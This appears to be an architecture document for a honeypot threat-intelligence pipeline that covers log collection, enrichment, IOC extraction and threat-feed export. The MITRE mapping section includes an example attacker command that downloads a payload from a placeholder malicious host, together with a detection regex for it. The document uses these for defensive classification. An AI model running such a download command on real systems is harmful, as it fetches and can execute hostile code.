# Architecture Documentation

Detailed technical architecture of the T-Pot Honeypot Threat Intelligence Infrastructure.

---

## Table of Contents

- [System Overview](#system-overview)
- [Network Architecture](#network-architecture)
- [Component Design](#component-design)
- [Data Flow](#data-flow)
- [Security Architecture](#security-architecture)
- [Scalability Considerations](#scalability-considerations)

---

## System Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                        INTERNET                                 │
│                   (Threat Actors)                               │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            │ Attacks
                            │
      ┌─────────────────────┼─────────────────────┐
      │                     │                     │
      ▼                     ▼                     ▼
┌───────────┐         ┌───────────┐         ┌───────────┐
│  COWRIE   │         │ DIONAEA   │         │ SURICATA  │
│ SSH/Telnet│         │Multi-Proto│         │    IDS    │
│ Honeypot  │         │ Honeypot  │         │           │
└─────┬─────┘         └─────┬─────┘         └─────┬─────┘
      │                     │                     │
      │ JSON Logs          │ Binary Logs         │ EVE JSON
      │                     │                     │
      └─────────────────────┼─────────────────────┘
                            │
                            ▼
                   ┌────────────────┐
                   │   LOGSTASH     │
                   │                │
                   │ • Parse        │
                   │ • Enrich       │
                   │ • Transform    │
                   └────────┬───────┘
                            │
                            ▼
                   ┌────────────────┐
                   │ ELASTICSEARCH  │
                   │                │
                   │ • Index        │
                   │ • Store        │
                   │ • Search       │
                   └────┬─────┬─────┘
                        │     │
              ┌─────────┘     └─────────┐
              ▼                         ▼
      ┌───────────────┐        ┌────────────────┐
      │    KIBANA     │        │ PYTHON SCRIPTS │
      │               │        │                │
      │ • Visualize   │        │ • IOC Extract  │
      │ • Dashboard   │        │ • Geo Mapping  │
      │ • Explore     │        │ • MITRE Map    │
      └───────────────┘        │ • Feed Gen     │
                               └────────┬───────┘
                                        │
                                        ▼
                               ┌────────────────┐
                               │ THREAT FEEDS   │
                               │                │
                               │ • STIX 2.1     │
                               │ • JSON         │
                               │ • CSV          │
                               │ • MISP         │
                               └────────────────┘
```

---

## Network Architecture

### Network Segmentation

```
┌─────────────────────────────────────────────────────────────┐
│                     Docker Host                             │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  Honeypot Network (172.20.0.0/24)                   │   │
│  │                                                       │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐          │   │
│  │  │ Cowrie   │  │ Dionaea  │  │Elastichon│          │   │
│  │  │172.20.0.1│  │172.20.0.1│  │172.20.0.1│          │   │
│  │  └──────────┘  └──────────┘  └──────────┘          │   │
│  └───────────────────────┬───────────────────────────────┘   │
│                          │                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  ELK Network (172.21.0.0/24)                        │   │
│  │                                                       │   │
│  │  ┌────────┐  ┌──────────┐  ┌────────┐  ┌────────┐ │   │
│  │  │Elastic-│  │ Logstash │  │ Kibana │  │ Redis  │ │   │
│  │  │search  │  │          │  │        │  │        │ │   │
│  │  └────────┘  └──────────┘  └────────┘  └────────┘ │   │
│  └───────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Port Mapping

| Service | Internal Port | External Port | Protocol | Purpose |
|---------|---------------|---------------|----------|---------|
| **Cowrie** | 2222 | 2222 | TCP | SSH honeypot |
| **Cowrie** | 2223 | 2223 | TCP | Telnet honeypot |
| **Dionaea** | 21 | 21 | TCP | FTP honeypot |
| **Dionaea** | 80 | 80 | TCP | HTTP honeypot |
| **Dionaea** | 443 | 443 | TCP | HTTPS honeypot |
| **Dionaea** | 445 | 445 | TCP | SMB honeypot |
| **Dionaea** | 3306 | 3306 | TCP | MySQL honeypot |
| **Dionaea** | 1433 | 1433 | TCP | MSSQL honeypot |
| **Dionaea** | 5060 | 5060 | UDP | SIP honeypot |
| **ElasticHoney** | 9200 | 9201 | TCP | Elasticsearch honeypot |
| **Elasticsearch** | 9200 | 9200 | TCP | **Management only** |
| **Kibana** | 5601 | 5601 | TCP | **Management only** |
| **Logstash** | 9600 | 9600 | TCP | **Metrics only** |

**Security Note:** Management ports (9200, 5601, 9600) should ONLY be accessible from trusted IPs via firewall rules.

---

## Component Design

### 1. Honeypot Layer

#### Cowrie (SSH/Telnet)

**Technology:** Python-based SSH/Telnet honeypot

**Capabilities:**
- Emulates vulnerable SSH/Telnet services
- Records username/password attempts
- Logs executed commands
- Captures file downloads (malware)
- Simulates filesystem

**Configuration:**
- Fake hostname: `srv-prod-01`
- SSH version string: `OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`
- Weak credentials enabled
- JSON logging to `/var/log/cowrie/cowrie.json`

#### Dionaea (Multi-Protocol)

**Technology:** C++-based low-interaction honeypot

**Protocols Supported:**
- HTTP/HTTPS (web exploits)
- FTP (file transfer attacks)
- SMB (Windows share exploits)
- MySQL/MSSQL (database attacks)
- SIP (VoIP attacks)

**Configuration:**
- Binaries stored in `/opt/dionaea/var/dionaea/binaries`
- JSON logging enabled
- VirusTotal integration (optional)

#### Suricata (IDS/IPS)

**Technology:** Network intrusion detection system

**Capabilities:**
- Protocol analysis (HTTP, FTP, SMB, TLS, etc.)
- Signature-based detection
- Anomaly detection
- EVE JSON output for structured logs

**Rules:**
- Emerging Threats ruleset
- Custom honeypot-specific rules

---

### 2. Log Processing Layer (Logstash)

#### Pipeline Architecture

```
Input → Filter → Output
  │       │         │
  │       │         └─> Elasticsearch (honeypot-*)
  │       │
  │       └─> GeoIP Enrichment
  │       └─> MITRE ATT&CK Mapping
  │       └─> Threat Scoring
  │
  └─> File Input (Cowrie JSON)
  └─> File Input (Dionaea logs)
  └─> File Input (Suricata EVE)
```

#### Processing Pipeline

1. **Input Stage:**
   - File input plugins monitor log files
   - JSON codec for structured parsing
   - Sincedb tracks file positions

2. **Filter Stage:**
   - **Timestamp Normalization:** Convert to @timestamp
   - **GeoIP Enrichment:** Add country, city, coordinates
   - **IOC Extraction:** Identify IPs, hashes, domains
   - **MITRE Mapping:** Classify commands to techniques
   - **Threat Scoring:** Calculate severity (0-100)

3. **Output Stage:**
   - **Main Index:** `honeypot-{type}-YYYY.MM.DD`
   - **Alerts Index:** `honeypot-alerts-*` (high severity)
   - **IOC Index:** `honeypot-iocs-*` (extracted indicators)

---

### 3. Storage Layer (Elasticsearch)

#### Index Strategy

**Daily Rolling Indices:**
```
honeypot-cowrie-2024.01.22
honeypot-dionaea-2024.01.22
honeypot-suricata-2024.01.22
honeypot-alerts-2024.01.22
honeypot-iocs-2024.01.22
```

**Index Template:**
```json
{
  "index_patterns": ["honeypot-*"],
  "template": {
    "settings": {
      "number_of_shards": 1,
      "number_of_replicas": 0,
      "refresh_interval": "5s"
    },
    "mappings": {
      "properties": {
        "@timestamp": {"type": "date"},
        "attacker_ip": {"type": "ip"},
        "threat_score": {"type": "integer"},
        "geoip.location": {"type": "geo_point"}
      }
    }
  }
}
```

#### Retention Policy

- **Hot data:** Last 7 days (SSD, full search)
- **Warm data:** 8-30 days (slower storage, searchable)
- **Cold data:** 31-90 days (archive, limited search)
- **Delete:** >90 days (automated cleanup)

---

### 4. Analysis Layer (Python Scripts)

#### IOC Extraction Engine

**Algorithm:**
```python
For each document in Elasticsearch:
    Extract IP addresses
    Extract file hashes (MD5/SHA256)
    Extract domains/URLs
    Extract credentials
    Calculate confidence score:
        confidence = (frequency * 0.5) +
                    (protocol_diversity * 0.2) +
                    (threat_score * 0.3)
    Filter by minimum confidence threshold
Export to JSON/CSV/STIX
```

#### Geographic Analysis

**Workflow:**
```
1. Query Elasticsearch for attacker IPs
2. Perform GeoIP lookup (MaxMind GeoLite2)
3. Aggregate by country/city
4. Identify attack corridors:
   - High volume (top 20% of countries)
   - Multiple unique IPs (>5)
   - Sustained activity
5. Generate heat map coordinates
6. Export to HTML (Leaflet.js)
```

#### MITRE ATT&CK Mapper

**Pattern Matching:**
```
Command: "wget http://malicious.com/payload.sh"
  ↓
Regex Match: /wget.*http/
  ↓
Technique: T1105 (Ingress Tool Transfer)
Tactic: Command and Control
  ↓
Store in Elasticsearch with technique ID
```

---

## Data Flow

### End-to-End Flow

```
1. Attacker → Honeypot
   SSH brute force attack on port 2222

2. Honeypot → Log File
   Cowrie logs to /var/log/cowrie/cowrie.json:
   {
     "eventid": "cowrie.login.failed",
     "username": "root",
     "password": "admin123",
     "src_ip": "192.0.2.1"
   }

3. Logstash → Parse & Enrich
   - Read JSON log
   - GeoIP lookup: 192.0.2.1 → China, Beijing
   - MITRE mapping: login attempt → T1110 (Brute Force)
   - Threat score: 15 (medium)

4. Logstash → Elasticsearch
   Index to: honeypot-cowrie-2024.01.22
   {
     "@timestamp": "2024-01-22T10:30:00Z",
     "attacker_ip": "192.0.2.1",
     "username": "root",
     "password": "admin123",
     "geoip": {
       "country_name": "China",
       "city_name": "Beijing",
       "location": {"lat": 39.9, "lon": 116.4}
     },
     "mitre_technique": "T1110",
     "threat_score": 15
   }

5. Python Script → Extract IOCs
   Query Elasticsearch:
   - Unique IPs: 192.0.2.1 (count: 47)
   - Confidence: 0.72
   Export to STIX 2.1

6. Kibana → Visualize
   - Geographic map: Pin on Beijing
   - Timeline: 47 attacks from this IP
   - Dashboard: Update attack counters
```

---

## Security Architecture

### Defense in Depth

**Layer 1: Network Isolation**
- Honeypots on isolated VLAN (172.20.0.0/24)
- No direct routing to production networks
- Firewall egress rules block lateral movement

**Layer 2: Resource Limits**
- CPU limits prevent resource exhaustion
- Memory limits prevent OOM attacks
- Rate limiting on ports (iptables)

**Layer 3: Data Sanitization**
- No real credentials exposed
- PII not collected
- Malware samples isolated in volumes

**Layer 4: Access Control**
- Management ports firewalled
- SSH key authentication only
- RBAC for Elasticsearch/Kibana

**Layer 5: Monitoring**
- Real-time alerts for anomalies
- Log integrity checks
- Regular security audits

---

## Scalability Considerations

### Horizontal Scaling

**Elasticsearch Cluster:**
```yaml
version: '3.8'
services:
  es-master:
    ...
  es-data-1:
    ...
  es-data-2:
    ...
  es-data-3:
    ...
```

**Logstash Pipeline Workers:**
```yaml
pipeline.workers: 8
pipeline.batch.size: 1000
```

**Multiple Honeypot Instances:**
```
Cowrie-1 → Port 2222 (Region: US-East)
Cowrie-2 → Port 2223 (Region: EU-West)
Cowrie-3 → Port 2224 (Region: Asia-Pacific)
```

### Vertical Scaling

**Resource Allocation:**
```
Elasticsearch: 16GB RAM, 8 CPU cores
Logstash: 4GB RAM, 4 CPU cores
Kibana: 2GB RAM, 2 CPU cores
Honeypots: 2GB RAM total, 2 CPU cores
```

### Performance Optimization

**Elasticsearch:**
- Use SSD storage
- Tune JVM heap (50% of RAM)
- Enable query cache
- Use index lifecycle management (ILM)

**Logstash:**
- Batch processing (batch_size: 1000)
- Multiple pipeline workers
- Persistent queues for reliability

---

## Technology Stack

| Layer | Technology | Version | Purpose |
|-------|------------|---------|---------|
| **Orchestration** | Docker Compose | 2.x | Container management |
| **Honeypots** | Cowrie | latest | SSH/Telnet emulation |
| | Dionaea | latest | Multi-protocol honeypot |
| | Suricata | 7.x | Network IDS |
| **Storage** | Elasticsearch | 8.11.x | Log indexing |
| **Processing** | Logstash | 8.11.x | Log parsing |
| **Visualization** | Kibana | 8.11.x | Dashboards |
| **Analysis** | Python | 3.9+ | IOC extraction |
| | Elasticsearch-py | 8.x | ES client |
| | GeoIP2 | 4.x | Geolocation |
| | STIX2 | 3.x | Threat feeds |

---

## Integration Points

### External Integrations

**MISP (Malware Information Sharing Platform):**
```python
# Upload IOCs to MISP
from pymisp import PyMISP
misp = PyMISP('https://misp.local', api_key, ssl=False)
event = misp.new_event(info='Honeypot IOCs')
misp.add_attribute(event, type='ip-src', value='192.0.2.1')
```

**SIEM Integration (Splunk):**
```
[tcp://9997]
connection_host = honeypot-elk
sourcetype = json
index = honeypot
```

**Firewall Automation:**
```bash
# Auto-block high-threat IPs
jq -r '.ips[] | select(.threat_score > 70) | .value' iocs.json | \
while read ip; do
  iptables -A INPUT -s $ip -j DROP
done
```

---

**Last Updated:** 2024-01-22
**Version:** 1.0.0
